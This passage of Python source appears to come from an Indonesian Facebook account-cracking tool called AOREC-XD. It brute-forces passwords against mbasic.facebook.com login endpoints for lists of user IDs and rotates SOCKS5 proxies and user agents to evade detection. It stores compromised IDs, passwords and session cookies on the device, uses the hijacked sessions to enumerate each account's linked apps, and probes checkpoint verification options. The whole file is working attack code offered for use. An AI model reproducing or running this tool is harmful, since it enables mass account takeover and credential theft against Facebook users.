					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Alvino_Adijaya_Xy <<<<<#

